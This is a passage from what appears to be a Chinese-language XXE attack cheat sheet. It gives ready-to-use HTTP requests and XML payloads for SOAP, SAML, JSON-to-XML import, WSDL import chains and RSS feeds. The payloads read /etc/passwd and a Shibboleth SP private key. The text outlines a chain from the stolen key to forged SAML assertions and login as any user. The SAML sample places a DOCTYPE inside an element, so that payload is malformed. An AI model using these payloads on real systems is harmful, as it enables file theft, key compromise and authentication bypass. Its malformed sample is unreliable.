## 八、SOAP/SAML/JSON 混合协议 XXE

### 8.1 SOAP Action XXE
```http
POST /soap/service HTTP/1.1
Content-Type: text/xml;charset=UTF-8
SOAPAction: "getUser"

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <getUser><id>&xxe;</id></getUser>
  </soapenv:Body>
</soapenv:Envelope>
```

### 8.2 SAML XXE（认证绕过）
```xml
<!-- SAML Response 注入 XXE 读取 SP 私钥/IdP 配置 -->
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shibboleth/sp-key.pem">
]>
  <saml:Assertion>...</saml:Assertion>
</samlp:Response>

<!-- 攻击链：读 SP 私钥 → 伪造 SAML 断言 → 直接登录任意用户
     或读 IdP 签名密钥 → 篡改断言属性提权 -->
```
**SAML 注释注入绕过签名验证**（部分实现缺陷）：在签名覆盖范围内插入注释改变断言语义，绕过 XML 签名校验。

### 8.3 JSON→XML 转换攻击（最易忽略）
```http
POST /api/import HTTP/1.1
Content-Type: application/json

{"data": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"}
```
**场景**：后端框架先收 JSON，字段值内含 XML 被二次 XML 解析（日志、导入、模板渲染）。

### 8.4 XML-RPC / WSDL 导入链
```xml
<!-- WSDL 顶层安全但 import 不安全：Apache CXF CVE-2026-65432
     顶层 WSDL 走硬化 StaxUtils，<wsdl:import>/<xsd:import> 交给未硬化的 WSDL4J -->
<!-- 影响 CXF < 4.2.3 / 4.1.8 / 3.6.12，构造恶意 WSDL 导入远程 DTD 即可 XXE -->
```
**打法**：找服务端点支持 WSDL 获取/上传的，替换为恶意 WSDL 带外部实体 import。

### 8.5 RSS/Atom 订阅 XXE
```xml
<!-- 订阅导入类功能（RSS 阅读器/聚合器）-->
<?xml version="1.0"?>
<!DOCTYPE rss [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss><channel><title>&xxe;</title></channel></rss>
```

